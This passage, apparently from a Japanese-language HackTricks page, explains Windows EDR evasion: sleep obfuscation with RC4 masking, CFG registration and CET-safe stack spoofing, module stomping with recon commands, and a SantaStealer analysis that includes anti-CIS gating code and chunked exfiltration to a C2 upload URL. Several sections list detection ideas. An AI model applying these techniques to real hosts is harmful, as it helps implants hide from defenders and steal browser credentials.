- 典型的な chain（x64）: image を `PAGE_READWRITE` にする → `advapi32!SystemFunction032` で mapped image 全体を RC4 encrypt → blocking wait を実行 → RC4 decrypt → PE section を walk して **section ごとの permission を restore** → completion を signal。
- `RtlCaptureContext` で template `CONTEXT` を取得し、それを複数 frame に clone して register（`Rip`/`Rcx`/`Rdx`/`R8`/`R9`）を設定し、各 step を実行する。

Operational detail: 長い wait に対しては「success」（例: `WAIT_OBJECT_0`）を返し、caller が image が masked されたまま続行するようにする。このパターンは idle window 中に module を scanner から隠し、典型的な「patched `Sleep()`」シグネチャを避ける。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callback の burst.
- 大きな contiguous な image-sized buffer に対する `advapi32!SystemFunction032` の使用.
- 大域的な `VirtualProtect` の後に custom な per-section permission restore が続く。

### Sleep-obfuscation gadget のための runtime CFG registration

CFG-enabled target では、`jmp [rbx]` や `jmp rdi` のような mid-function gadget への最初の indirect jump は、通常 `STATUS_STACK_BUFFER_OVERRUN` で process を crash させる。これは、その gadget が module の CFG metadata に存在しないためである。hardening された process 内で Ekko/Kraken-style chain を生かし続けるには:

- chain が使うすべての indirect destination を `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で register する。
- loaded image（`ntdll`, `kernel32`, `advapi32`）内の address については、`MEMORY_RANGE_ENTRY` は **image base** から始め、**full image size** を cover しなければならない。
- manual-mapped/PIC/stomped region では、代わりに **allocation base** と allocation size を使う。
- dispatch gadget だけでなく、indirect に到達する export（`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls）や、indirect target になる attacker-controlled executable section も mark する。

これにより、ROP/JOP-style の sleep chain は「non-CFG process でのみ動くもの」から、`explorer.exe`、browser、`svchost.exe`、および `/guard:cf` 付きで compile された他の endpoint でも再利用可能な primitive になる。

### Sleeping thread 向けの CET-safe stack spoofing

Full `CONTEXT` replacement は noisy で、spoofed `Rip` が hardware shadow stack と一致していなければならないため、CET Shadow Stack system では壊れる可能性がある。より安全な sleep-masking pattern は:

- 同一 process 内の別 thread を選び、`NtQueryInformationThread` でその `NT_TIB` / TEB stack bounds（`StackBase`, `StackLimit`）を読む。
- 現在 thread の real TEB/TIB を backup する。
- `GetThreadContext` で real な sleeping context を capture する。
- spoof context には real `Rip` だけを copy し、spoofed `Rsp`/stack state はそのままにする。
- sleep window 中、spoof thread の `NT_TIB` を current TEB に copy し、stack walker が legitimate な stack range 内で unwind するようにする。
- wait が終わったら、元の TIB と thread context を restore する。

これは CET-consistent な instruction pointer を保ちながら、TEB stack metadata を信頼して unwind を検証する EDR stack walker を誤誘導する。

### APC-based alternative: Kraken Mask

timer-queue dispatch の signature が強すぎる場合、同じ sleep-encrypt-spoof-restore sequence を、queued APC を使って suspended helper thread から実行できる:

- `NtTestAlert` を entrypoint として helper thread を作成する。
- `NtQueueApcThread` で prepared な `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で drain する。
- helper stack を使い切らないよう、chain state は helper stack ではなく heap に保存する。
- 開始 event を atomically signal しつつ block するために `NtSignalAndWaitForSingleObject` を使う。
- TIB/context を restore する前に main thread を suspend し（`NtSuspendThread` → restore → `NtResumeThread`）、scanner が半分だけ restore された stack を捕捉できる race window を減らす。

これにより、`CreateTimerQueueTimer` + `NtContinue` の signature を helper-thread/APC signature に置き換えつつ、同じ RC4 masking と stack-spoofing の目的を維持できる。

Additional detection ideas
- `NtSetInformationVirtualMemory` と `VmCfgCallTargetInformation` が、sleep、wait、または APC dispatch の直前に使われる。
- `GetThreadContext`/`SetThreadContext` が `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, または `ConnectNamedPipe` を囲んで使われる。
- `NtQueryInformationThread` の後に、current thread の TEB/TIB stack bounds へ直接 write する。
- `NtQueueApcThread`/`NtAlertResumeThread` chain が、間接的に `SystemFunction032`, `VirtualProtect`, または section-permission restoration helper に到達する。
- `FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）のような短い gadget signature の反復使用が、signed module 内の dispatch pivot として現れる。


## Precision Module Stomping

Module stomping は、明白な private executable memory を allocate したり、新しい sacrificial DLL を load したりする代わりに、**target process 内にすでに mapped されている DLL の `.text` section** から payload を実行する。overwrite target は、process がまだ必要とする code path を壊さずに payload を吸収できる **loaded, disk-backed image** であるべきだ。

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` のような一般的な module を狙う naive な stomping は脆弱である: その DLL が remote process に load されていない可能性があり、code region が小さすぎると process が crash する。より信頼できる workflow は次の通り:

1. target process の module を列挙し、すでに loaded な DLL の **names-only include list** を保持する。
2. まず payload を build し、その **正確な byte size** を記録する。
3. 候補 DLL を disk 上で scan し、PE section の **`.text` `Misc_VirtualSize`** を payload size と比較する。これは file size より重要で、memory に mapped されたときの executable section のサイズを反映するからである。
4. **Export Address Table (EAT)** を解析し、stomp 開始位置として exported function の RVA を選ぶ。
5. **blast radius** を計算する: payload が選択した function boundary を超えると、memory 上でその後ろに並ぶ隣接 export を上書きしてしまう。

wild でよく見られる典型的な recon/selection helper は:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
運用上の注意
- `LoadLibrary`/予期しない image load の telemetry を避けるため、リモート process では**すでに loaded されている** DLL を優先する。
- 対象アプリケーションでめったに実行されない export を優先する。そうしないと、通常の code path が thread creation の前後で stomp された bytes に到達する可能性がある。
- 大きな implant では、shellcode の埋め込みを string literal から**byte-array/braced initializer** に変更する必要がよくある。そうすることで、injector source 内で full buffer が正しく表現される。

検出のアイデア
- 一般的な private RWX/RX allocations ではなく、**image-backed executable pages**（`MEM_IMAGE`, `PAGE_EXECUTE*`）への remote write。
- メモリ上の bytes が backing file on disk と一致しなくなった export entry point。
- 最近最初の bytes が変更された正当な DLL export 内で実行を開始する remote thread や context pivot。
- DLL の `.text` pages に対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` の sequence の後に thread creation が続く。

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer（別名 BluelineStealer）は、現代の info-stealer が AV bypass、anti-analysis、credential access を 1 つの workflow にまとめる方法を示している。

### Keyboard layout gating & sandbox delay

- config flag（`anti_cis`）が `GetKeyboardLayoutList` を使ってインストール済みの keyboard layouts を列挙する。Cyrillic layout が見つかると、サンプルは空の `CIS` marker を落として stealer を実行する前に終了し、除外対象の locale では絶対に detonatе しない一方で hunting artifact は残す。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` ロジック

- Variant A は process list を走査し、各 name を custom rolling checksum で hash して、debuggers/sandboxes 用の埋め込み blocklists と比較する。さらに computer name に対しても checksum を繰り返し実行し、`C:\analysis` のような working directories を確認する。
- Variant B は system properties（process-count の下限、recent uptime）を調べ、VirtualBox additions を検出するために `OpenServiceA("VBoxGuest")` を呼び出し、single-stepping を見つけるために sleep 前後の timing checks を実行する。どれかに一致すると modules の起動前に abort する。

### Fileless helper + double ChaCha20 reflective loading

- primary DLL/EXE は Chromium credential helper を埋め込んでおり、これは disk に drop されるか、または in-memory で manual mapping される。fileless mode では imports/relocations を自分で解決するため、helper artifacts は書き込まれない。
- その helper は、ChaCha20（2 つの 32-byte keys + 12-byte nonces）で 2 回暗号化された second-stage DLL を保持する。両方の pass の後、blob を reflective に load し（`LoadLibrary` なし）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) から派生した `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports を呼び出す。
- ChromElevator routines は direct-syscall reflective process hollowing を使って live な Chromium browser に注入し、AppBound Encryption keys を継承し、ABE hardening にもかかわらず SQLite databases から password/cookies/credit cards を直接 decrypt する。


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` は global `memory_generators` function-pointer table を反復し、enabled な module（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとに 1 thread を生成する。各 thread は shared buffers に結果を書き込み、約 45 秒の join window 後に file count を報告する。
- 完了すると、すべてが statically linked な `miniz` library で `%TEMP%\\Log.zip` として zip される。続いて `ThreadPayload1` は 15s sleep し、`http://<C2>:6767/upload` へ HTTP POST で archive を 10 MB chunks に分けて stream する際、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を spoof する。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意の `w: <campaign_tag>` が追加され、最後の chunk には `complete: true` が付加されるため、C2 は reassembly が完了したことを把握できる。

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
